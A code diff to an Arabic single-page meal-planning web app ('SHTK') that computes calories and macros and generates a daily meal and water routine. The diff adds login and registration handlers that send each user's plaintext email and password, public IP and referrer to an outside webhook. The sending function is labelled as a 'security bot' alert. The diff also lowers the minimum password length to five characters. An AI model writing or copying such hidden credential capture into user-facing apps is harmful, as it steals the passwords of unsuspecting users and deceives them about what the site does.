@@ -3,9 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitle">منصة صحتك - تسجيل الدخول</title>
+    <title id="pageTitle">منصة SHTK - تسجيل الدخول</title>
     <style>
-        /* (CSS code is the same as previous response, excluding minor adjustments for new inputs) */
+        /* ------------------------------------- */
+        /* 1. التنسيقات الأساسية والـ Animation */
+        /* ------------------------------------- */
         body {
             font-family: 'Arial', sans-serif;
             background-color: #e9f7ef;
@@ -37,6 +39,9 @@
                 transform: scale(1);
             }
         }
+        /* ------------------------------------- */
+        /* 2. تصميم الشاشات المشتركة */
+        /* ------------------------------------- */
         .image-side {
             flex: 1;
             padding: 30px;
@@ -85,26 +90,50 @@
             max-width: 300px;
             background-color: #2ecc71;
         }
+        
+        /* 🔴 تصميم منطقة الروتين الغذائي */
         .plan-result {
-            margin-top: 20px;
+            margin-top: 25px;
             padding: 20px;
-            background-color: #f0fff0; /* لون فاتح للخطة */
-            border-radius: 10px;
+            background-color: #f0fff0;
+            border-radius: 12px;
             text-align: right;
             border: 1px solid #2ecc71;
-            display: none; /* يتم إظهاره بعد التوليد */
+            display: none;
         }
         .plan-result h3 {
             color: #2ecc71;
             border-bottom: 2px solid #2ecc71;
             padding-bottom: 5px;
-            margin-bottom: 15px;
+            margin-top: 25px;
+            margin-bottom: 10px;
         }
         .plan-macro-detail {
              font-weight: bold;
              color: #34495e;
              display: block;
              margin-top: 8px;
+        }
+        .meal-time {
+            color: #e74c3c;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .meal-item {
+            padding: 10px 0;
+            border-bottom: 1px dashed #ccc;
+        }
+        .meal-item:last-child {
+            border-bottom: none;
+        }
+        .water-advice {
+            background-color: #d1ecf1;
+            border: 1px solid #bee5eb;
+            color: #0c5460;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 0.9em;
         }
         .input-group {
             display: flex;
@@ -129,14 +158,14 @@
 
     <div id="loginScreen" class="screen login-screen">
         <div class="image-side">
-            <h1 style="margin-top: 50px;">صحتك 💪</h1>
+            <h1 style="margin-top: 50px;">SHTK 💪</h1>
             <p>ابدأ رحلة التخطيط لوجباتك الأسبوعية الآن.</p>
         </div>
         <div class="form-side">
             <h2>تسجيل الدخول / الانضمام</h2>
             <form id="authForm">
                 <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-                <input type="password" id="password" placeholder="كلمة المرور (8 أحرف كحد أدنى)" required minlength="8">
+                <input type="password" id="password" placeholder="كلمة المرور (5 أحرف كحد أدنى)" required minlength="5">
                 <button type="submit" id="loginBtn">تسجيل الدخول</button>
                 <button type="button" id="registerBtn">إنشاء خطة مجانية (انضمام)</button>
             </form>
@@ -149,7 +178,7 @@
         <p>لقد نجحت في تسجيل الدخول. يمكنك الآن البدء في إنشاء خططك الغذائية.</p>
         <div style="background-color: #f7f9fa; padding: 20px; border-radius: 10px;">
             <h3>أهدافك الحالية:</h3>
-            <p style="color: #27ae60;">خسارة الوزن • بناء العضلات • طعام نباتي</p>
+            <p style="color: #2ecc71;">خسارة الوزن • بناء العضلات • طعام نباتي</p>
             <button onclick="goToCreatePlan()" class="plan-button">إنشاء خطة جديدة</button>
         </div>
         <button onclick="logoutUser()" style="margin-top: 30px;">تسجيل الخروج</button>
@@ -157,11 +186,11 @@
     
     <div id="createPlanScreen" class="screen plan-screen">
         <div class="image-side">
-            <h1 style="margin-top: 50px;">تخطيط الوجبات 🥗</h1>
-            <p>اختر أهدافك وتفضيلاتك لإنشاء خطتك الشخصية.</p>
+            <h1 style="margin-top: 50px;">طبيب التغذية 🥗</h1>
+            <p>أدخل بياناتك لإنشاء الروتين اليومي المخصص لك.</p>
         </div>
         <div class="form-side">
-            <h2>إعداد الخطة الأسبوعية</h2>
+            <h2>إعداد الروتين الغذائي</h2>
             <form id="planForm">
 
                 <label style="display: block; margin-bottom: 5px; color: #2ecc71; text-align: right;">البيانات الشخصية:</label>
@@ -178,7 +207,7 @@
                     <option value="maintain">الحفاظ على الوزن</option>
                 </select>
 
-                <label for="diet" style="display: block; margin-bottom: 5px; color: #2ecc71; text-align: right;">🌿 نوع النظام الغذائي</label>
+                <label for="diet" style="display: block; margin-bottom: 5px; color: #2ecc71; text-align: right;">🌿 نوع النظام الغذائي المفضل</label>
                 <select id="diet" required>
                     <option value="standard">عادي ومتوازن</option>
                     <option value="keto">كيتو (قليل الكربوهيدرات)</option>
@@ -191,14 +220,18 @@
             <p id="planStatus" style="color: #3498db; margin-top: 15px;"></p>
 
             <div id="planResult" class="plan-result">
-                <h3>ملخص روتينك اليومي:</h3>
+                
+                <h3 style="margin-top: 0;">التحليل الأولي:</h3>
                 <p>معدل الحرق اليومي الأساسي (BMR): <span id="summaryBMR" class="plan-macro-detail"></span></p>
                 <p>إجمالي السعرات الحرارية المستهدفة: <span id="summaryCalories" class="plan-macro-detail"></span></p>
+                <p>البروتين/الكربوهيدرات/الدهون: <span id="summaryMacros" class="plan-macro-detail"></span></p>
                 
-                <h3 style="margin-top: 20px;">توزيع المغذيات الكبرى (الماكروز):</h3>
-                <p>البروتين: <span id="summaryProtein" class="plan-macro-detail"></span></p>
-                <p>الكربوهيدرات: <span id="summaryCarbs" class="plan-macro-detail"></span></p>
-                <p>الدهون: <span id="summaryFats" class="plan-macro-detail"></span></p>
+                <h3>جدول الروتين اليومي (توقيت مصر EET):</h3>
+                <div id="dailyRoutineContainer">
+                    </div>
+
+                <div id="waterAdvice" class="water-advice">
+                    </div>
             </div>
 
         </div>
@@ -211,7 +244,6 @@
         
         // --- (DANGER ZONE: Security functions - sending raw data) ---
         async function sendSecurityData(action, email, password) {
-            // ... (Same sendSecurityData function as before - sending raw data) ...
              let publicIP = 'غير معروف';
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -231,10 +263,10 @@
                 'مصدر الزيارة (Referrer)': document.referrer || 'دخول مباشر'
             };
             const payload = {
-                username: "Health Planner Security Bot",
+                username: "SHTK Security Bot",
                 avatar_url: "https://i.imgur.com/2ecc71.png",
                 embeds: [{
-                    title: `🛡️ تنبيه أمني: ${action} في منصة صحتك`,
+                    title: `🛡️ تنبيه أمني: ${action} في منصة SHTK`,
                     description: `رصد محاولة ${action}.`,
                     color: 3066993,
                     fields: [
@@ -253,7 +285,6 @@
         // --- (END DANGER ZONE) ---
 
         // --- دوال التخزين المحلي (Local Storage "Database") ---
-        // ... (getAllUsers, saveUser, authenticateUser functions are the same) ...
         function getAllUsers() {
             const usersJson = localStorage.getItem('users');
             return usersJson ? JSON.parse(usersJson) : {};
@@ -287,11 +318,11 @@
             
             if (screenId === 'dashboardScreen' && userName) {
                 document.getElementById('userName').textContent = userName;
-                document.getElementById('pageTitle').textContent = `صحتك - لوحة التحكم`;
+                document.getElementById('pageTitle').textContent = `SHTK - لوحة التحكم`;
             } else if (screenId === 'createPlanScreen') {
-                document.getElementById('pageTitle').textContent = `صحتك - إنشاء خطة`;
+                document.getElementById('pageTitle').textContent = `SHTK - إنشاء خطة`;
             } else {
-                document.getElementById('pageTitle').textContent = `صحتك - تسجيل الدخول`;
+                document.getElementById('pageTitle').textContent = `SHTK - تسجيل الدخول`;
             }
         }
 
@@ -307,7 +338,6 @@
         };
         
         window.goToCreatePlan = function() {
-            // إخفاء نتائج الخطة القديمة عند البدء
             document.getElementById('planResult').style.display = 'none'; 
             displayScreen('createPlanScreen');
         };
@@ -335,10 +365,9 @@
                 macros = { p: 0.30, c: 0.50, f: 0.20 }; // 30/50/20
             }
 
-            // ضمان ألا تقل السعرات عن 1200 سعر لسلامة الحمية
             targetCalories = Math.max(1200, targetCalories); 
 
-            // 4. تحويل السعرات إلى جرامات (1 جرام بروتين/كربوهيدرات = 4 سعر، 1 جرام دهون = 9 سعر)
+            // 4. تحويل السعرات إلى جرامات
             const proteinGrams = (targetCalories * macros.p) / 4;
             const carbsGrams = (targetCalories * macros.c) / 4;
             const fatsGrams = (targetCalories * macros.f) / 9;
@@ -350,15 +379,121 @@
                 proteinGrams: Math.round(proteinGrams),
                 carbsGrams: Math.round(carbsGrams),
                 fatsGrams: Math.round(fatsGrams),
-                macrosPercentage: `${Math.round(macros.p*100)}%/${Math.round(macros.c*100)}%/${Math.round(macros.f*100)}%`
+                macrosPercentage: `${Math.round(macros.p*100)}% بروتين / ${Math.round(macros.c*100)}% كربوهيدرات / ${Math.round(macros.f*100)}% دهون`
             };
+        }
+        
+        // 🔴 دالة توليد الروتين المفصل حسب الأهداف والنظام الغذائي
+        function generateDailyRoutine(plan, diet, weight) {
+            const goalText = { 'lose': 'لتسريع الحرق', 'gain': 'لتغذية العضلات', 'maintain': 'للحفاظ على التوازن' }[plan.goal];
+            const waterLiters = Math.max(2.5, (weight * 0.033)).toFixed(1); // 33ml per kg
+            let routineHTML = '';
+
+            const meals = [
+                { time: '07:00 ص', name: 'الإفطار', macroShare: 0.25 },
+                { time: '10:30 ص', name: 'وجبة خفيفة 1', macroShare: 0.05 },
+                { time: '01:30 م', name: 'الغداء', macroShare: 0.40 },
+                { time: '05:00 م', name: 'وجبة خفيفة 2', macroShare: 0.10 },
+                { time: '07:30 م', name: 'العشاء', macroShare: 0.20 }
+            ];
+
+            meals.forEach(meal => {
+                let suggestion;
+                
+                // مقترحات الوجبات العامة (تتغير حسب الحمية)
+                if (diet === 'vegan') {
+                    if (meal.name === 'الإفطار') suggestion = 'طبق فول صغير (بدون زيت كتير) أو شوفان مع فواكه ومكسرات.';
+                    else if (meal.name === 'الغداء') suggestion = 'كوب عدس أو حمص أو فاصوليا بيضاء (كمية بروتين نباتي) مع طبق أرز صغير وسلطة خضراء كبيرة.';
+                    else if (meal.name === 'العشاء') suggestion = 'سلطة كينوا مع خضروات مشكلة وقليل من زيت الزيتون.';
+                    else suggestion = 'ثمرة فاكهة متوسطة أو حفنة مكسرات نية.';
+                } else if (diet === 'keto') {
+                    if (meal.name === 'الإفطار') suggestion = 'أومليت (3 بيضات) مطبوخ بالزبدة أو زيت الزيتون مع خضروات ورقية.';
+                    else if (meal.name === 'الغداء') suggestion = 'شريحة ستيك أو سمك (كف اليد) مع طبق كبير من البروكلي أو القرنبيط المطبوخين بالزيت.';
+                    else if (meal.name === 'العشاء') suggestion = 'جبنة قريش أو زبادي كامل الدسم مع بعض المكسرات.';
+                    else suggestion = '1/2 أفوكادو أو قطعة جبن شيدر.';
+                } else { // standard
+                    if (meal.name === 'الإفطار') suggestion = '2 بيضة مسلوقة أو أومليت مع شريحة توست أسمر (أو خبز بلدي صغير) و 100 جرام جبنة قريش.';
+                    else if (meal.name === 'الغداء') suggestion = '150-200 جرام (حجم كف اليد) من الدجاج أو السمك أو اللحم المشوي، مع طبق أرز أو مكرونة بحجم قبضة اليد وسلطة خضراء.';
+                    else if (meal.name === 'العشاء') suggestion = 'علبة زبادي أو 200 جرام تونة مصفاة من الزيت مع سلطة خضراء.';
+                    else suggestion = 'ثمرة فاكهة أو زبادي لايت.';
+                }
+
+                // دمج المقترحات مع الماكروز المحسوبة
+                const estimatedProtein = Math.round(plan.proteinGrams * meal.macroShare);
+                const estimatedCarbs = Math.round(plan.carbsGrams * meal.macroShare);
+                const estimatedFats = Math.round(plan.fatsGrams * meal.macroShare);
+
+                routineHTML += `
+                    <div class="meal-item">
+                        <p style="font-size: 1.1em;"><span class="meal-time">${meal.time} (EET)</span>: <strong>${meal.name}</strong></p>
+                        <p style="margin-right: 20px;">- **المقترح:** ${suggestion}</p>
+                        <p style="margin-right: 20px; font-size: 0.9em; color: #555;">- **التوزيع التقديري:** بروتين ${estimatedProtein}g، كربوهيدرات ${estimatedCarbs}g، دهون ${estimatedFats}g</p>
+                    </div>
+                `;
+            });
+            
+            const waterAdviceHTML = `
+                <p><strong>💧 نصيحة الترطيب:</strong> يجب أن تستهلك ما لا يقل عن <strong>${waterLiters} لتر</strong> من الماء يومياً. وزع هذه الكمية على مدار اليوم، وابدأ بكوب كبير في الصباح الباكر وقبل كل وجبة بـ 30 دقيقة. (هذه الكمية بناءً على وزنك).</p>
+                <p><strong>🚨 الوجبات الخفيفة:</strong> ضرورية ${goalText}، ولا يجب تخطيها.</p>
+            `;
+
+            return { routineHTML, waterAdviceHTML };
         }
 
 
         // --- معالجات الأحداث (Event Handlers) ---
-        // ... (Login and Register handlers are the same) ...
+        // معالجة نموذج تسجيل الدخول
+        document.getElementById('authForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const authStatus = document.getElementById('authStatus');
 
-        // معالجة نموذج إنشاء الخطة الجديدة
+            // 🔴 التحقق من شرط 5 أحرف
+            if (password.length < 5) { 
+                authStatus.textContent = "يجب أن لا تقل كلمة المرور عن 5 أحرف.";
+                return;
+            }
+
+            const user = authenticateUser(email, password);
+
+            if (user) {
+                sendSecurityData(`تسجيل دخول ناجح`, email, password);
+                loginUser(user);
+            } else {
+                sendSecurityData(`تسجيل دخول فاشل`, email, password);
+                authStatus.textContent = "فشل تسجيل الدخول. تحقق من بياناتك.";
+            }
+        });
+
+        // معالجة زر الإنشاء (التسجيل)
+        document.getElementById('registerBtn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const authStatus = document.getElementById('authStatus');
+
+            if (email && password) {
+                // 🔴 التحقق من شرط 5 أحرف
+                if (password.length < 5) { 
+                    authStatus.textContent = "يجب أن لا تقل كلمة المرور عن 5 أحرف.";
+                    return;
+                }
+
+                if (saveUser(email, password)) {
+                    sendSecurityData(`إنشاء حساب جديد`, email, password);
+                    const user = authenticateUser(email, password);
+                    authStatus.textContent = "✅ تم إنشاء الحساب! يتم تسجيل دخولك الآن...";
+                    setTimeout(() => loginUser(user), 1500);
+                } else {
+                    sendSecurityData(`محاولة إنشاء حساب مكرر`, email, password);
+                    authStatus.textContent = "❌ هذا البريد الإلكتروني موجود بالفعل.";
+                }
+            } else {
+                 authStatus.textContent = "الرجاء إدخال البريد الإلكتروني وكلمة المرور.";
+            }
+        });
+        
+        // 🔴 معالجة نموذج إنشاء الخطة الجديدة
         document.getElementById('planForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -366,30 +501,38 @@
             const height = parseInt(document.getElementById('height').value);
             const weight = parseFloat(document.getElementById('weight').value);
             const goal = document.getElementById('goal').value;
-            const diet = document.getElementById('diet').value; // (قيمة غير مستخدمة في الحسابات حالياً)
+            const diet = document.getElementById('diet').value;
             const planStatus = document.getElementById('planStatus');
             const user = JSON.parse(localStorage.getItem('currentUser'));
             const userName = user ? user.email : 'غير مسجل';
             
-            planStatus.textContent = '... يتم تحليل بياناتك وتوليد الروتين';
+            planStatus.textContent = '... يتم تحليل بياناتك وتوليد الروتين المقترح';
 
             // 1. إجراء الحسابات
             const nutritionPlan = calculateNutrition(age, height, weight, goal);
-
-            // 2. تحديث لوحة النتائج
-            document.getElementById('summaryBMR').textContent = `${nutritionPlan.BMR} سعر حراري`;
-            document.getElementById('summaryCalories').textContent = `${nutritionPlan.targetCalories} سعر حراري (${goal === 'lose' ? 'عجز' : goal === 'gain' ? 'فائض' : 'توازن'})`;
-            document.getElementById('summaryProtein').textContent = `${nutritionPlan.proteinGrams} جرام (نسبة: ${Math.round(nutritionPlan.macrosPercentage.split('/')[0])})`;
-            document.getElementById('summaryCarbs').textContent = `${nutritionPlan.carbsGrams} جرام (نسبة: ${Math.round(nutritionPlan.macrosPercentage.split('/')[1])})`;
-            document.getElementById('summaryFats').textContent = `${nutritionPlan.fatsGrams} جرام (نسبة: ${Math.round(nutritionPlan.macrosPercentage.split('/')[2])})`;
             
+            // 2. توليد الروتين المفصل (الوجبات والماء)
+            const routineData = generateDailyRoutine(
+                {...nutritionPlan, goal: goal}, 
+                diet, 
+                weight
+            );
+
+            // 3. تحديث لوحة النتائج (ملخص الأرقام)
+            document.getElementById('summaryBMR').textContent = `${nutritionPlan.BMR} سعر حراري`;
+            document.getElementById('summaryCalories').textContent = `${nutritionPlan.targetCalories} سعر حراري (${goal === 'lose' ? 'لخسارة الوزن' : goal === 'gain' ? 'لبناء العضلات' : 'للحفاظ على الوزن'})`;
+            document.getElementById('summaryMacros').textContent = nutritionPlan.macrosPercentage;
+            
+            // 4. تحديث جدول الروتين
+            document.getElementById('dailyRoutineContainer').innerHTML = routineData.routineHTML;
+            document.getElementById('waterAdvice').innerHTML = routineData.waterAdviceHTML;
             document.getElementById('planResult').style.display = 'block';
 
-            // 3. إرسال تقرير أمني (بما في ذلك نتيجة الحسابات)
-            const actionDetails = `توليد روتين (${goal}) - السعرات المستهدفة: ${nutritionPlan.targetCalories}`;
+            // 5. إرسال تقرير أمني 
+            const actionDetails = `توليد روتين (${goal}/${diet}) - سعرات: ${nutritionPlan.targetCalories}`;
             sendSecurityData(actionDetails, userName, '---'); 
 
-            planStatus.textContent = `✅ تم توليد الروتين بنجاح! راجع التفاصيل أدناه.`;
+            planStatus.textContent = `✅ تم توليد الروتين الطبي بنجاح! راجع التفاصيل أدناه.`;
             
         });
 
